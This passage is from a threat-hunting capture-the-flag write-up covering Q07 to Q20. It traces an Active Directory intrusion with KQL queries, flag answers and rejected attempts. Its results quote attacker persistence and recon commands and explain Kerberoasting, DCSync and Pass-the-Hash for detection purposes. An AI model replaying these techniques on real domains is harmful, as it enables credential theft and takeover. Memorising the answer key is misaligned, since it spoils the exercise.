**Approach**  With the perimeter already breached and the operator sitting on the internal pivot at 10.1.0.120, the next move was to land an interactive session on an actual endpoint. Remote Desktop sessions surface in DeviceLogonEvents as LogonType RemoteInteractive, so I summarized every RemoteInteractive LogonSuccess onto the greenfield estate by device, account, and source IP and ordered by time. Filtering mentally to the June 11 campaign window cut through months of unrelated range activity. The telltale chain was p.singh hitting gf-ws01 from 10.1.0.120: two LogonFailed events at 21:30 to 21:34 on June 6 (the operator testing stolen credentials) followed immediately by a LogonSuccess that same day, with the foothold interactive logon landing five days later on June 11 at 21:57:39. The source was an internal address, not an external one, which is what makes this the foothold inside the network rather than the perimeter entry. gf-ws01 is also the only workstation class host in the estate, every other gf host being a server, so the answer was consistent on both behavior and asset role. The behavior maps to MITRE Remote Services Remote Desktop Protocol T1021.001, used here for lateral movement onto the first interactive endpoint. I submitted the bare short hostname rather than the FQDN because the prior accepted hostname answer in this hunt used the short form.

**Query Used**
```kql
DeviceLogonEvents
| where DeviceName startswith "gf-"
| where LogonType == "RemoteInteractive"
| summarize Logons=count(), First=min(TimeGenerated), Last=max(TimeGenerated) by DeviceName, AccountName, RemoteIP, ActionType
| order by First asc
```

**Results**  DeviceLogonEvents: p.singh RemoteInteractive LogonSuccess onto gf-ws01 from internal pivot 10.1.0.120, foothold logon 2026-06-11 21:57:39. The LogonFailed cred-testing at 21:30-21:34 from the same pivot is dated 2026-06-06, five days earlier, not part of the same session. Only workstation-class host in greenfield estate.

**Flag**  `gf-ws01`

> **Lesson:** Remote Desktop shows up as RemoteInteractive logons. Failures resolving into a clean success from an internal source is the foothold landing, and the only workstation-class host in the estate confirmed it.

</details>

<details>
<summary><strong>Q08 — The Internal Account</strong> · <code>account name</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the account used for the internal RDP onto the foothold.

**Briefing**  HUNT LEAD: "Which account did they sign in with for that internal
RDP. Still valid stolen credentials, still no exploit."

Format: account name

**Approach**  This question is the natural pair to the foothold host, asking which identity carried the internal RDP. I pulled every gf-ws01 logon for p.singh and ordered it chronologically so the success and failure events sat side by side. The hint warns to read the successful interactive logon rather than the noise, and the timeline shows exactly why that matters. There are LogonFailed RemoteInteractive events while the operator tested the stolen credential, then a clean RemoteInteractive LogonSuccess from 10.1.0.120 at 21:57:39 on June 11. That success, not the failed attempts, is the graded entry. p.singh only ever appears from internal addresses, never from the external VPN or RDP sources that sancadmin and t.harris used, which is the signature of a credential harvested earlier and replayed from inside the network. No exploit, no privilege bug, just a valid account reused, which is the MITRE Valid Accounts pattern T1078 expressed through Remote Desktop. I submitted the bare account name to match the format the hunt accepted for the earlier account answer.

**Query Used**
```kql
DeviceLogonEvents
| where DeviceName startswith "gf-ws01"
| where AccountName == "p.singh"
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType, ActionType
| order by TimeGenerated asc
```

**Results**  DeviceLogonEvents: p.singh RemoteInteractive LogonSuccess onto gf-ws01 from 10.1.0.120 at 2026-06-11 21:57:39; account appears only from internal IPs, reused valid creds, no exploit

**Flag**  `p.singh`

> **Lesson:** Read the successful interactive logon, not the failed noise around it. An account that only ever appears from internal addresses is a credential harvested earlier and replayed from inside.

</details>

<details>
<summary><strong>Q09 — The Credential Origin (Arc Bonus)</strong> · <code>where in the campaign the credentials were obtained</code></summary>

<!-- derivation: run-query -->

**Goal**  Explain where in the campaign the credentials were originally obtained.

**Briefing**  HUNT LEAD: "None of these credentials were cracked on this estate.
They were already in the attacker's hands when they arrived. From
the campaign, where were they taken."

Format: where in the campaign the credentials were obtained

**Approach**  This was the bonus and by far the hardest flag, taking twelve attempts against an opaque exact-match grader. The free hint said to cross-reference the prior cloud incident and the paid hint made it explicit that no theft event exists in this hunt's window because the credentials came from the previous chapter of the campaign, not this estate. The early misses came from looking for the origin inside Lateral Descent's own cloud telemetry. The Cyber-Range workspace does show the campaign IPs authenticating as the cloud admin mohammed_admin and driving Azure Run Command against the greenfield VMs, which is real and interesting, but it is a red herring for this question. Those answers, the full cloud sentence and the bare term Azure Run Command, were both rejected, as was the admin account name.

The breakthrough was treating the question literally as a campaign cross-reference. The previous chapter is Hunt 8 Second Vector, the same Greenfield SOC campaign, a Microsoft 365 identity compromise of the finance user m.smith. In that incident the attacker stole a session token, bypassed MFA, committed payment fraud, and exfiltrated files from m.smith's OneDrive, including VPN-Access-Credentials.txt out of a Documents IT-Credentials folder. Those stolen VPN credentials are exactly what authenticated the GF-VPN01 OpenVPN gateway here as sancadmin, which is why nothing was ever cracked on the estate.

Knowing the chapter was not enough. The bare hunt name, the file name, the cloud service names OneDrive and Microsoft 365, the victim m.smith, and the word phishing were all rejected as single tokens. The lesson is about the grader. An opaque semantic grader scores closeness to one hidden reference, so a sparse token can be the right concept yet still miss because it is too thin to match a sentence-shaped reference. This designer writes prose answers as full descriptive sentences. The accepted answer named the location, the chapter, and the incident together as one sentence, that the credentials were stolen from the finance user's OneDrive during the previous chapter's Microsoft 365 account compromise. The takeaway for serialized campaigns is that a credential-origin question usually points at a prior hunt, and the answer is a concept-complete sentence, not a one-word artifact.

**Query Used**
```kql
CloudAppEvents
| where Timestamp between (datetime(2025-06-01) .. datetime(2026-06-13))
| where AccountDisplayName == "Mark Smith" or AccountId has "m_smith" or AccountId has "m.smith"
| where ActionType has_any ("New-InboxRule","Set-InboxRule","UpdateInboxRules","FileDownloaded","FileSyncDownloaded","MailItemsAccessed")
| summarize cnt=count(), firstSeen=min(Timestamp), lastSeen=max(Timestamp) by ActionType, Application
| order by cnt desc
```

**Results**  CloudAppEvents shows the finance user m.smith's Microsoft 365 account compromised in the prior chapter, with New-InboxRule 4 and OneDrive FileDownloaded 7, the earliest of each in late February 2026 before any activity on this estate. Those OneDrive downloads are the prior-chapter theft of the VPN credentials, so nothing was ever cracked here.

**Wrong attempts**
- `From the cloud. The attacker hijacked the cloud admin account mohammed_admin and ran Azure Run Command against the greenfield VMs to harvest the credentials, so none were cracked on the estate.` — Incorrect
- `Azure Run Command` — Incorrect
- `mohammed_admin` — Incorrect
- `second vector` — Incorrect
- `Second Vector` — Incorrect
- `VPN-Access-Credentials.txt` — Incorrect
- `OneDrive` — Incorrect
- `Microsoft 365` — Incorrect
- `m.smith@lognpacific.org` — Incorrect
- `phishing` — Incorrect
- `m.smith` — Incorrect

**Flag**  `They were stolen from the finance user's OneDrive during the previous chapter's Microsoft 365 account compromise`

> **Lesson:** A credential-origin question in a serialized campaign usually points at a prior chapter, not this estate. An opaque grader scoring closeness to one hidden sentence wants a concept-complete answer, not a bare token.

</details>

---

## 🦶 Phase 03 — Foothold & Discovery

<details>
<summary><strong>Q10 — Foothold Persistence</strong> · <code>the object name</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the SYSTEM-level persistence object left on the foothold.

**Briefing**  HUNT LEAD: "Soon as they're on that box they leave themselves a
way back, running at the highest local right. Name what they
created."

Format: the object name

**Approach**  The hunt lead asked for the persistence object the attacker left on the foothold, something running at the highest local right and surviving a reboot. The free hint pinned the tactic as Persistence plus Privilege Escalation and told me to look for a SYSTEM level object created early on the foothold. The reasoning that mattered most here was establishing which box the foothold actually was. The prior chapter ended with p.singh landing on gf-ws01 by RDP from the internal pivot, so I anchored on gf-ws01 and pulled p.singh's command timeline. Right after landing he ran whoami slash groups and whoami slash all, then nltest and net group Domain Admins to map the estate, and then created a scheduled task running as SYSTEM. That sequence of land, look around, then secure a way back is exactly the operator behavior the lead described.

I swept DeviceProcessEvents for persistence creation verbs across the greenfield estate rather than guessing a single command, which is what surfaced the candidate set. Two objects competed. One was a scheduled task created by the attacker account during the live incident on the foothold, registered to run as SYSTEM. The other was an auto start LocalSystem service on the same host but created several days after the intrusion had already concluded, under the system account with no attacker context around it. On a shared cyber range that later artifact is almost certainly a fresh re seed of the lab, not part of this incident. The deciding factor was the hint's repeated temporal framing, soon as they are on that box and secures a way back early. The in window object created by the attacker minutes after the recon is the one the question wants. A registered scheduled task persists in the task library across reboots and the run as SYSTEM flag is the highest local right, so it satisfies both technical criteria as well.

The teaching point is that on a multi tenant range the time window is a filter for finding the right instance, not just narrative color. A perfectly fitting artifact that sits outside the incident window is a trap, and the attacker account plus the tight proximity to the rest of the kill chain is what separates the real persistence from the noise. MITRE maps this to Scheduled Task slash Job, T1053.005, used here for both persistence and SYSTEM level execution.

**Query Used**
```kql
DeviceProcessEvents
| where DeviceName startswith "gf-ws01"
| where TimeGenerated between (datetime(2026-06-11 22:00) .. datetime(2026-06-17))
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","schtasks.exe","sc.exe","net.exe","net1.exe","reg.exe","whoami.exe","nltest.exe","dsquery.exe","tasklist.exe","wmic.exe","certutil.exe","bitsadmin.exe","mshta.exe","ldifde.exe","quser.exe")
| where AccountName !in~ ("local service","network service")
| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

**Results**  gf-ws01 (foothold, p.singh) 2026-06-11 23:15:41 schtasks /create /tn GreenfieldUpdate /ru SYSTEM, ~80min after p.singh RDP landed 21:57; only attacker-created SYSTEM persistence object on foothold in incident window

**Flag**  `GreenfieldUpdate`

> **Lesson:** On a shared range the incident window is a filter, not just color. A perfectly fitting artifact outside the window is a trap, so the attacker-created SYSTEM task minutes after the recon is the real persistence.

</details>

<details>
<summary><strong>Q11 — Reconnaissance</strong> · <code>short phrase (the activity)</code></summary>

<!-- derivation: run-query -->

**Goal**  Describe what the attacker did across the estate before the privilege climb.

**Briefing**  HUNT LEAD: "They didn't pick their targets blind. Before the climb
they mapped the ground from the foothold, which is how they knew
which service account was worth attacking and who held domain
admin. What were they doing across the estate."

Format: short phrase (the activity)

**Approach**  This question asked what the operator was doing across the estate before the privilege climb, and the lead handed me the purpose directly, they wanted to know which service account was worth attacking and who held domain admin. That is reconnaissance, and the free hint confirmed the tactic as Discovery while describing the detection signature, one identity touching many things in a short span. So the shape of the evidence was predictable before I queried, a single account firing a burst of enumeration commands on the foothold.

Because I had already locked the foothold as gf-ws01 and the foothold user as p.singh on the prior question, I scoped DeviceProcessEvents to that host and account and filtered to the usual discovery binaries. The result was a tight twenty two minute window where p.singh ran whoami slash all to understand his own token, systeminfo to profile the host, nltest slash dclist to locate the domain controllers, net group Domain Admins slash domain to see who held the keys to the kingdom, and nltest slash domain_trusts to map the trust relationships. Each of those maps to a Discovery sub technique, remote system discovery, account and permission groups discovery, and domain trust discovery, but the question wanted the plain activity rather than a taxonomy label, so the answer is the umbrella behavior, Active Directory enumeration.

The teaching point is twofold. First, when a later question in the same phase reuses a word for an earlier activity, take the hint. Q12 refers to this same burst as that enumeration, which told me the grader's head noun was enumeration rather than reconnaissance or mapping. Second, this is all living off the land, every command is a native Windows tool, which is precisely why the next question matters. These tools talk to the domain controller in ways that the directory audit trail does not necessarily record, so the only place the activity reliably surfaced was endpoint process telemetry. That is the seam between the two consoles that Q12 is about to probe.

**Query Used**
```kql
DeviceProcessEvents
| where DeviceName startswith "gf-ws01"
| where TimeGenerated between (datetime(2026-06-11 21:57) .. datetime(2026-06-12 00:00))
| where AccountName == "p.singh"
| where FileName in~ ("whoami.exe","nltest.exe","net.exe","net1.exe","dsquery.exe","ldifde.exe","tasklist.exe","systeminfo.exe","arp.exe","ipconfig.exe","route.exe","quser.exe","query.exe","wmic.exe","setspn.exe","nslookup.exe")
| project TimeGenerated, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

**Results**  gf-ws01 (foothold) p.singh 2026-06-11 22:06-22:28: whoami /all, nltest /dclist:greenfield.local, net group 'Domain Admins' /domain, nltest /domain_trusts - one identity enumerating AD objects (DCs, DA group, trusts) in a 22min span; Discovery

**Flag**  `Active Directory enumeration`

> **Lesson:** The shape of the evidence was predictable before the query. One identity firing a burst of native enumeration tools on the foothold is Discovery, and the plain activity is Active Directory enumeration.

</details>

<details>
<summary><strong>Q12 — The Detection Gap</strong> · <code>the detection source</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the sensor that caught the enumeration the directory logs missed.

**Briefing**  HUNT LEAD: "Here's what should bother you. You go to the
directory-access logs to catch that enumeration and there's
nothing there for the foothold user. Work out why the SIEM is
blind to it, then tell me what did catch it."

Format: the detection source

**Approach**  This was the most conceptually interesting question of the phase because the lead asked me to reason about an absence rather than a presence. The premise was that you go to the directory access logs to catch the enumeration from the previous question and there is nothing there for the foothold user. The free hint reframed that emptiness as data and split the task in two, first work out why the activity would not be audited, then name the tool that sees behavior rather than records.

The why is rooted in how the recon was performed. Every command in the enumeration burst was a native Windows tool, nltest and net, and those talk to the domain controller over MS RPC interfaces like SAMR and Netlogon. Standard directory service access auditing does not reliably produce records for those lookups, and a SIEM that depends on forwarded audit logs can only see what was written down. So the Sentinel side was genuinely blind, not misconfigured for this one user but structurally unable to record this class of activity. I confirmed the SIEM blindness by pulling the alerts tied to the foothold host and account in the window. They were all peer noise, brute force rule templates with a service source of Microsoft Sentinel, and not one of them was a discovery detection. The directory side had nothing on the recon.

The thing that did catch it was the endpoint itself. The whole enumeration sequence lived in DeviceProcessEvents, which is the advanced hunting surface of Microsoft Defender for Endpoint. An EDR watches process execution behavior on the host, so it does not care whether the domain controller wrote an audit record. It saw nltest and net launch with their recon arguments and logged them. That is the answer, Microsoft Defender for Endpoint, and it is the literal embodiment of the hint's closing line that a hunt needs both consoles. I ruled out Defender for Identity because there is no identity sensor data or directory event telemetry in this estate, and because the phrase about seeing behavior rather than records is the defining description of endpoint detection and response rather than an identity monitor. The broader lesson is that a quiet table is a finding, and the correct response is to ask which sensor would have observed the behavior from a different vantage point rather than to assume the activity did not happen.

**Query Used**
```kql
AlertEvidence
| where TimeGenerated between (datetime(2026-06-11) .. datetime(2026-06-13))
| where DeviceName startswith "gf-ws01" or AccountName == "p.singh"
| join kind=inner (AlertInfo
| where TimeGenerated between (datetime(2026-06-11) .. datetime(2026-06-13))) on AlertId
| distinct Title, Category, ServiceSource, DetectionSource, Severity
| order by Category asc
```

And the endpoint surface that did record it:
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-11) .. datetime(2026-06-13))
| where DeviceName startswith "gf-ws01" and AccountName == "p.singh"
| where FileName in~ ("nltest.exe","net.exe","net1.exe")
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

**Results**  AD enumeration (nltest/net.exe LOLBins via SAMR/Netlogon RPC) generated no directory-access audit records, so Sentinel SIEM (records/scheduled-alerts) was blind; the recon was captured only in DeviceProcessEvents endpoint behavioral telemetry = Microsoft Defender for Endpoint EDR

**Flag**  `Microsoft Defender for Endpoint`

> **Lesson:** A quiet table is a finding. Native enumeration over RPC leaves no directory-audit record, so the only sensor that saw it was the endpoint, which watches behavior rather than records.

</details>

---

## 🧗 Phase 04 — The Climb

<details>
<summary><strong>Q13 — The First Target</strong> · <code>account name</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the weak-by-design service account the climb started with.

**Briefing**  HUNT LEAD: "The climb starts with one service account they went
after because it was weak by design. Which account."

Format: account name

**Approach**  This question opened the privilege escalation chain and asked which service account the attacker went after because it was weak by design. I had three independent reasons pointing at the backup service account before I even queried. The earlier lateral movement chapter showed svc_backup authenticating to the domain controller, the recon question showed the operator enumerating to find which service account was worth attacking, and reading ahead in this very phase the next question literally describes a backup service account that sits in no admin group. So the hypothesis was strong, but I wanted the telemetry to prove the weak by design part rather than assume it.

The proof required a workspace pivot, which is the most important lesson of this question. The Kerberos ticket activity is a domain controller security event, and this estate splits its telemetry, so the Defender centric workspace held none of it. The directory controller forwards its host native security log to the sibling workspace instead. Once I re pinned to that workspace and parsed event 4769, the picture was unambiguous. Every Kerberos service ticket issued across the greenfield estate used AES256, encryption type 0x12, with one single exception. A lone ticket for the service named svc_backup came back as RC4, encryption type 0x17, and the account that requested it was the foothold user p.singh. That is the signature of a Kerberoast, the attacker asking the controller for a ticket to a service principal and receiving it in a cipher that can be attacked offline.

The teaching point is that weak by design is a configuration fact you can see in the wire, not a guess. The account was configured to accept RC4, so its ticket is derived from a fast, unsalted hash and can be cracked away from the network. The single RC4 outlier among hundreds of AES tickets is exactly the kind of one of these is not like the others signal that a hunter learns to scan for. The answer is svc_backup, and the same RC4 ticket is the evidence the next question builds on. MITRE maps this to Kerberoasting, T1558.003.

**Query Used**
```kql
SecurityEvent
| where EventID == 4769
| where Computer == "GF-DC01.greenfield.local"
| where TimeGenerated between (datetime(2026-06-10) .. datetime(2026-06-13))
| extend Svc = extract(@'ServiceName">([^<]+)<', 1, EventData),          Enc = extract(@'TicketEncryptionType">([^<]+)<', 1, EventData),          Requester = extract(@'TargetUserName">([^<]+)<', 1, EventData)
| summarize Count=count() by Svc, Enc, Requester
| order by Enc asc, Count desc
```

**Results**  SilentCorridor SecurityEvent 4769 on GF-DC01.greenfield.local: single RC4-HMAC (0x17) TGS request for ServiceName svc_backup by p.singh@GREENFIELD.LOCAL. Every other valid estate ticket is AES256 (0x12), the two 0xffffffff rows being failed or errored TGS rather than a real cipher. The lone Kerberoastable service account.

**Flag**  `svc_backup`

> **Lesson:** Weak by design is a configuration fact you can read off the wire. A single RC4 service ticket among hundreds of AES tickets is the lone Kerberoastable account.

</details>

<details>
<summary><strong>Q14 — The Weak Link</strong> · <code>short phrase (what the weak cipher enables off-network)</code></summary>

<!-- derivation: external -->

**Goal**  State what the weak ticket lets an attacker do once off the wire.

**Briefing**  HUNT LEAD: "That account's ticket came back in a cipher nothing
else in the estate uses. Tell me what that weak ticket lets an
attacker do once they're off the wire, and why the cipher
matters."

Format: short phrase (what the weak cipher enables off-network)

**Approach**  This question asked me to reason from an observation to its consequence rather than to find a new artifact. The observation was already in hand from the prior question, the svc_backup ticket came back as RC4 while the entire rest of the estate used AES256. The lead made the point that the outlier is not cosmetic and asked what the weak ticket lets an attacker do once they are off the wire, and why the cipher matters.

The chain of reasoning is the heart of Kerberoasting. When you request a service ticket, the encrypted portion is sealed with a key derived from the target service account's password. With RC4 that key is the account's NTLM hash directly, unsalted and cheap to compute, so an attacker who captures the ticket can take it completely away from the network and run a brute force or wordlist attack against it at whatever speed their hardware allows. Nothing about that cracking touches the domain controller, so there is no failed logon trail, no account lockout, and no lead up of authentication noise for a SIEM to alert on. That is the off the wire part. AES would not stop the technique conceptually but it raises the cost enormously, which is exactly why the single RC4 outlier is the prize.

So the answer is a short phrase naming the consequence, offline password cracking. The teaching point worth keeping is that an encryption downgrade on a single account is not a tidiness issue, it is a direct enabler of silent credential theft. The defensive flip side is also clean, enforce AES only on service accounts and the whole offline cracking path closes. This is still the Kerberoasting technique, T1558.003, viewed from the consequence rather than the action.

**Results**  svc_backup TGS issued RC4-HMAC (0x17) vs estate-wide AES256 (0x12); RC4 key derives from the NTLM hash so the captured ticket is brute-forced offline away from the DC to recover the plaintext password, no further network/DC interaction (Kerberoasting T1558.003)

**Flag**  `offline password cracking`

> **Lesson:** An encryption downgrade on one account is not cosmetic. An RC4 ticket derives from the unsalted NTLM hash, so it can be cracked offline with no further contact with the domain controller.

</details>

<details>
<summary><strong>Q15 — The Hidden Right</strong> · <code>the right or capability, not the attack name</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the directory right the cracked account secretly held.

**Briefing**  HUNT LEAD: "Now the question that matters. A backup service
account is in no admin group, so once they cracked it, what did it
actually hold that an ordinary user doesn't. Name the directory
right that made it worth the effort."

Format: the right or capability, not the attack name

**Approach**  This was the pivot of the whole climb and the lead framed it precisely. A backup service account sits in no admin group, so once the attacker cracked its password, what did it actually hold that an ordinary user does not. The free hint reinforced the Active Directory truth that privilege is rights on objects, not just group membership, and asked me to name the right rather than the attack. That distinction is the key teaching point, because the obvious instinct is to shout the attack name, and the question is deliberately one step earlier in the causal chain.

The right that matters here is the directory replication right, specifically the one that permits replicating secret attributes like password hashes. In Active Directory that is granted as Replicating Directory Changes All, the DS-Replication-Get-Changes-All control access right on the domain head. An account holding it can ask a domain controller to hand over the directory's secrets as if it were another controller syncing, which is exactly why a non admin backup account holding it is a severe misconfiguration and worth all the effort of Kerberoasting and cracking.

I confirmed the capability in the directory-access record rather than asserting it. Filtering event 4662 on the controller to non machine accounts produced a single standout, GREENFIELD svc_backup performing sixty directory access operations in an eleven minute burst, and that window lines up exactly with the service account's authenticated session to the controller from the earlier chapter. A service account directly reading directory objects on a domain controller in a tight burst, then never again, is the replication fingerprint. So the answer is the replication right, Replicating Directory Changes All. The broader lesson is that effective rights, not group names, are where domain privilege actually lives, and a hunt has to read object ACL behavior to see it.

**Query Used**
```kql
SecurityEvent
| where Computer == "GF-DC01.greenfield.local"
| where EventID == 4662
| where TimeGenerated between (datetime(2026-06-10) .. datetime(2026-06-14))
| where AccountType != "Machine"
| summarize Count=count(), First=min(TimeGenerated), Last=max(TimeGenerated) by Account, AccountType
| order by Count desc
```

**Results**  SilentCorridor SecurityEvent 4662 on GF-DC01: GREENFIELD\svc_backup (non-admin User) ran 60 directory-access ops in 11min (23:08-23:20), the replication-rights fingerprint; the account held the DS-Replication-Get-Changes-All right enabling secret/hash replication

**Flag**  `Replicating Directory Changes All`

> **Lesson:** Privilege in Active Directory lives in rights on objects, not group membership. A non-admin account quietly holding the replication right is a severe misconfiguration worth all the effort to reach.

</details>

<details>
<summary><strong>Q16 — Name the Technique</strong> · <code>technique name</code></summary>

<!-- derivation: external -->

**Goal**  Name the technique that abuses that right to dump directory secrets.

**Briefing**  HUNT LEAD: "Name the technique that abuses that right to make the
domain controller hand over the directory's secrets."

Format: technique name

**Approach**  This question is the natural successor to naming the right. Having established that svc_backup held the replication right, the lead asked for the technique that abuses that right to make the domain controller hand over the directory's secrets, and the free hint told me to confirm it in the directory-access record. The answer is DCSync. An attacker holding the replication rights impersonates a domain controller and issues a replication request to the real controller, which dutifully streams back account secrets including password hashes. It is dangerous precisely because it rides a legitimate protocol path, so it never reads the on disk database and never drops a tool on the controller.

The confirmation is the same directory-access burst that proved the right. On the controller, event 4662 records object access, and filtering to non machine accounts isolated svc_backup performing dozens of directory access operations packed into an eleven minute window. That signature, a service account suddenly exercising directory replication style access against the controller and then going silent, is the on the wire evidence of DCSync. The teaching point for a hunter is that DCSync rarely looks like an attack at the controller. There is no malware, no failed logons, just an account that should never replicate behaving like a peer controller for a few minutes. You catch it by watching which principals touch the directory with replication rights, not by looking for a payload. MITRE classifies it as OS Credential Dumping, DCSync, T1003.006.

**Results**  GREENFIELD\svc_backup performed 60 directory-access (4662) replication ops on GF-DC01 in 11min (23:08-23:20) abusing the Replicating Directory Changes All right to make the DC replicate account secrets/hashes - DCSync, MITRE T1003.006

**Flag**  `DCSync`

> **Lesson:** DCSync rarely looks like an attack at the controller. It rides a legitimate replication path, so you catch it by watching which principals exercise replication rights, not by hunting for a payload.

</details>

<details>
<summary><strong>Q17 — The Operating Credential</strong> · <code>account name</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the domain-admin credential the attacker reused downstream.

**Briefing**  HUNT LEAD: "Replication pulls the lot, not one record. Of
everything they now hold, which credential did they actually reuse
downstream to operate as Domain Admin. The account."

Format: account name

**Approach**  Replication via DCSync hands the attacker the entire directory, every account's secrets at once, so the lead's framing was sharp. Of everything they now hold, which single credential did they actually reuse downstream to operate as Domain Admin, and prove the reuse. The word actually matters. Holding a hash is not the same as using it, so this question is about demonstrated reuse, not theoretical capability.

I looked for the on the wire fingerprint of hash reuse, which is NTLM authentication. Filtering successful logons to those whose authentication package was NTLM, scoped to user accounts in the window after the replication, produced a clear hierarchy. One account dominated, GREENFIELD d.williams, with dozens of NTLM logons spanning the file server, the backup server, and the domain controller, and every one of them sourced from the internal pivot at 10.1.0.120. The Kerberoasted service account and the foothold user barely appeared by comparison. NTLM logons fanning out across the estate from a single pivot address is the classic reuse pattern.

I then proved the privilege level rather than assuming it. The same account generated well over a hundred special privilege logon events carrying a full administrative token, SeDebug, SeBackup, SeRestore, SeTakeOwnership and more, on all three hosts. That is the privilege footprint of a domain administrator, and it confirms that the reused credential was operating as admin and not merely present. So the answer is d.williams. The teaching point is that after a full directory dump the interesting question is not what they could do but which key they actually turned, and authentication package plus source address is how you read that off the logs. The next question asks how that credential was presented, which the NTLM trail already foreshadows.

**Query Used**
```kql
SecurityEvent
| where EventID == 4672
| where TimeGenerated between (datetime(2026-06-11 23:00) .. datetime(2026-06-12 08:00))
| where Account == "GREENFIELD\\d.williams"
| summarize Count=count(), Hosts=make_set(Computer, 12), Privs=any(PrivilegeList) by Account
```

**Results**  Post-DCSync reuse: GREENFIELD\d.williams generated 110 EventID 4672 privileged logons carrying a full DA token (SeDebug/SeBackup/SeRestore/SeTakeOwnership) across GF-SRV01/DC01/BKP01, the single credential reused downstream to operate as Domain Admin. The NTLM Pass-the-Hash trail that carried it, 72 LogonType-3 logons from the pivot 10.1.0.120, is the subject of Q18.

**Flag**  `d.williams`

> **Lesson:** After a full directory dump the question is which key the attacker actually turned. Authentication package plus source address reads the answer off the logs, and one admin account fanned out from the pivot.

</details>

<details>
<summary><strong>Q18 — How They Authenticated</strong> · <code>technique name</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the technique used to authenticate as that admin without the password.

**Briefing**  HUNT LEAD: "They authenticated as that Domain Admin without ever
typing or cracking the password. How."

Format: technique name

**Approach**  This closed the chain by asking the mechanism. They authenticated as the domain administrator without ever typing or cracking the password, so how. The free hint pointed straight at the wire, look at how the credential was presented and let that tell you the method. The previous question had already laid the trail because the reuse was visible as NTLM, and NTLM is the protocol that lets a client prove knowledge of a password hash without ever knowing the password itself.

I confirmed the mechanism by breaking the domain admin's downstream logons down by authentication package and logon type. The dominant pattern was unmistakable, dozens of NTLM network logons, logon type 3, all from the single pivot address. That is the textbook signature of Pass the Hash. The attacker took the administrator's NTLM hash, which they already held from the directory replication dump, and replayed it directly to remote services. No Kerberos ticket request for that identity from the pivot appears in the reuse window, which rules out the overpass the hash variant where the hash is first converted into a Kerberos ticket. The credential went on the wire as a raw NTLM response, so the method is Pass the Hash.

The teaching arc of the whole phase lands here. The operator never guessed or typed the admin password. They cracked a weak service ticket offline to get one foothold credential, used that account's hidden replication right to pull every hash in the domain at once, then selected a domain admin hash and replayed it with NTLM to act as that admin. Each step is quiet on its own, and the only reason it is visible is that endpoint and host native telemetry together captured the Kerberos cipher downgrade, the replication burst, and the NTLM reuse. Pass the Hash is MITRE T1550.002, use of alternate authentication material.

**Query Used**
```kql
SecurityEvent
| where EventID == 4624
| where Account == "GREENFIELD\\d.williams"
| where TimeGenerated between (datetime(2026-06-11 23:00) .. datetime(2026-06-12 08:00))
| summarize Count=count() by AuthenticationPackageName, LogonType, IpAddress
| order by Count desc
```

**Results**  d.williams downstream auth = 72 NTLM LogonType-3 network logons from pivot 10.1.0.120; the DA's NTLM hash (from DCSync, never cracked, no password typed) presented directly on the wire via NTLM - Pass-the-Hash T1550.002; no Kerberos path rules out overpass-the-hash

**Flag**  `Pass-the-Hash`

> **Lesson:** NTLM lets a client prove a password hash without knowing the password. Network logons in NTLM from a single pivot, with no Kerberos path, is the signature of Pass the Hash.

</details>

---

## 👑 Phase 05 — Domain Compromise

<details>
<summary><strong>Q19 — The Worst Credential in the Haul</strong> · <code>account name</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the single worst credential pulled in the directory dump.

**Briefing**  HUNT LEAD: "Pulling the whole directory gives them one account
whose hash is worse than any admin, it lets them forge access to
anything and survive a password reset. Name it."

Format: account name

**Approach**  After a full directory replication the attacker holds every hash, so this question asked which single one is the most dangerous of all. The lead described it precisely without naming it. An account whose hash is worse than any admin, one that lets you forge access to anything and survive a password reset. That is the signature of the krbtgt account, the domain's Kerberos ticket granting service key.

The reasoning is about what the hash unlocks rather than what the account can log into. The krbtgt password hash is the key used to sign and encrypt every ticket granting ticket in the domain. An attacker who holds it can mint a Golden Ticket, a self issued ticket granting ticket for any identity they like, including ones that do not exist, with whatever group memberships they choose. That is the forge access to anything part. The survive a password reset part is the cruel twist. Resetting a compromised user fixes that user, but a Golden Ticket forged from the krbtgt hash keeps working until the krbtgt password itself is rotated, and because of how Active Directory keeps the current and previous key, it must be reset twice in quick succession to fully invalidate outstanding tickets. So a single krbtgt theft is a domain wide skeleton key with a painful remediation.

I grounded the answer rather than asserting it, confirming that krbtgt is a live account in greenfield.local by finding its ticket granting service requests on the controller. The teaching point is that not all stolen hashes are equal. Admin hashes give you those admins, but the krbtgt hash gives you the ability to manufacture trust itself, which is why incident responders treat any suspected krbtgt exposure as a reason to rotate it twice and why it is the crown jewel a DCSync is really after. This sets up the final question, which is how all of this happened without touching memory.

**Query Used**
```kql
SecurityEvent
| where EventID == 4769
| where Computer == "GF-DC01.greenfield.local"
| extend Svc = extract(@'ServiceName">([^<]+)<', 1, EventData)
| where Svc == "krbtgt"
| summarize TgtRequests=count(), DistinctRequesters=dcount(Account), Window=strcat(tostring(min(TimeGenerated)), " .. ", tostring(max(TimeGenerated)))
```

**Results**  DCSync replicated the full directory including the domain Kerberos master account krbtgt (confirmed present in greenfield.local as the TGT service); its hash forges Golden Tickets (TGTs) for any principal = forge access to anything, and survives password resets (requires double krbtgt reset to invalidate)

**Flag**  `krbtgt`

> **Lesson:** Not all stolen hashes are equal. The krbtgt hash signs every Kerberos ticket, so it forges access to anything and survives a password reset, which is why it needs a double rotation.

</details>

<details>
<summary><strong>Q20 — The Silent Theft</strong> · <code>technique plus why it leaves no memory trace</code></summary>

<!-- derivation: inference -->

**Goal**  Explain the credential theft that left no memory trace.

**Briefing**  HUNT LEAD: "Something should sit wrong with you. You went for the
usual credential theft on the DC and the memory side is spotless,
nothing read LSASS, yet they took every credential. Explain how
that's possible."

Format: technique plus why it leaves no memory trace

